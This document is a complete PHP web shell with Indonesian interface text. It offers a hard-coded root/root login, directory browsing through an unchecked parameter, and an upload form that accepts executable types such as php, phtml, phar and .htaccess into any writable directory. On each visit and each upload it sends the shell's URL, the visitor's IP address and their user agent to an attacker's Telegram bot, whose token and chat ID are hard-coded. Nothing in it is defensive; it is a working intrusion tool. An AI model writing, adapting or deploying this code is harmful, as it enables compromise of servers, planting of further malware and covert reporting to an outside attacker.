<?php
session_start();

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];

        if ($username == 'root' && $password == 'root') {
            $_SESSION['logged_in'] = true;
            $_SESSION['username'] = $username;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error_message = 'Invalid username or password';
        }
    }

    echo '<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <title>Login</title>
    </head>
    <body class="bg-dark text-light">
        <div class="container d-flex justify-content-center align-items-center" style="height: 100vh;">
            <div class="box shadow bg-dark p-4 rounded-3">
                <h3 class="text-center">Login</h3>
                ' . (isset($error_message) ? '<div class="alert alert-danger">' . $error_message . '</div>' : '') . '
                <form action="" method="post">
                    <div class="mb-3">
                        <label for="username" class="form-label">Username</label>
                        <input type="text" class="form-control" name="username" required>
                    </div>
                    <div class="mb-3">
                        <label for="password" class="form-label">Password</label>
                        <input type="password" class="form-control" name="password" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Login</button>
                </form>
            </div>
        </div>
    </body>
    </html>';
    exit();
}

session_start();
function sendToTelegram($message) {
    $botToken = "7743508003:AAGeB7fTbUUQgsW6Uy9M2F__iRSqa1Go-Tc";
    $chatID = "8103935631";
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatID,
        'text' => $message
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    return $result ? true : false;
}

$fileUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$ipAddress = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$message = "File URL: $fileUrl\nIP Address: $ipAddress\nUser-Agent: $userAgent";
sendToTelegram($message);

$status_message = "";
$status_class = "";
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

if (!is_dir($current_dir)) {
    $current_dir = getcwd();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $file_tmp = $_FILES['image']['tmp_name'];
    $file_name = basename($_FILES['image']['name']);
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'php', 'phtml', 'cgi', 'shtml', 'phar', 'pl', 'ph*', 'sh*', '.htaccess', 'as*', 'cf*', 'js*', 'swf*', 'vb*'];
    $file_extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));

    $target_dir = isset($_POST['dir']) && !empty(trim($_POST['dir'])) ? rtrim($_POST['dir'], '/') : $current_dir;

    if (is_dir($target_dir) && is_writable($target_dir)) {
        if (in_array($file_extension, $allowed_extensions)) {
            $target_file = $target_dir . "/" . $file_name;

            if (move_uploaded_file($file_tmp, $target_file)) {
                $status_message = "File berhasil diupload ke $target_file";
                $status_class = "success";

                $ip_address = $_SERVER['REMOTE_ADDR'];
                $user_agent = $_SERVER['HTTP_USER_AGENT'];

                $telegram_message = "File uploaded successfully:\n" .
                                    "- File URL: " . $target_file . "\n" .
                                    "- IP Address: " . $ip_address . "\n" .
                                    "- User Agent: " . $user_agent;
                sendToTelegram($telegram_message);
            } else {
                $status_message = "Gagal memindahkan file.";
                $status_class = "error";
            }
        } else {
            $status_message = "Jenis file tidak diperbolehkan. Hanya file: " . implode(', ', $allowed_extensions);
            $status_class = "error";
        }
    } else {
        $status_message = "Direktori tidak valid atau tidak dapat ditulis: $target_dir";
        $status_class = "forbidden";
    }
}
?>

<html>
   <head>
      <style>
         .blink {
            animation: blink 1s infinite;
         }
         @keyframes blink {
            50% {
               opacity: 0;
            }
         }
         .success {
            color: lime;
         }
         .error {
            color: red;
         }
         .forbidden {
            color: white;
         }
         .directory {
            color: cyan;
            text-decoration: none;
         }
         .directory:hover {
            text-decoration: underline;
         }
         .file {
            color: lime;
         }
      </style>
   </head>
   <body style="text-align: center;background-color: black;font-size: 0px;">
      <br><br>
      <form action="" method="POST" enctype="multipart/form-data" style="font-size: medium;color: white;margin-top: 10px;">
         <b>For Public Folder Only</b><br><br>
         <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="Masukkan direktori tujuan..." style="border: 1.5px solid lime;border-radius: 5px;margin-bottom: 10px; width: 300px;" /><br>
         <input type="file" name="image" style="border: 1.5px solid lime;border-radius: 5px;" /><br><br>
         <input type="submit" value="Upload" style="border: 1.5px solid lime;color: white;border-radius: 5px;background: transparent;padding: 3px;cursor: pointer;" />
      </form>
      <br>
      <span class="blink <?php echo $status_class; ?>" style="font-size: medium;">
         <?php echo htmlspecialchars($status_message, ENT_QUOTES, 'UTF-8'); ?>
      </span>
      <br><br>
      <span style="font-size: medium;color: white;">
         <?php echo "Current directory: " . htmlspecialchars($current_dir, ENT_QUOTES, 'UTF-8'); ?>
      </span>
      <br><br>
      <div style="color: white; text-align: left; margin-left: 20px;">
         <b>Isi Direktori:</b><br>
         <?php
         $files = scandir($current_dir);
         foreach ($files as $file) {
             if ($file === "." || $file === "..") continue;
             $file_path = $current_dir . "/" . $file;
             if (is_dir($file_path)) {
                 echo "<a href=\"?dir=" . urlencode($file_path) . "\" class=\"directory\">[DIR] $file</a><br>";
             } else {
                 echo "<span class=\"file\">[FILE] $file</span><br>";
             }
         }
         ?>
      </div>
   </body>
</html>
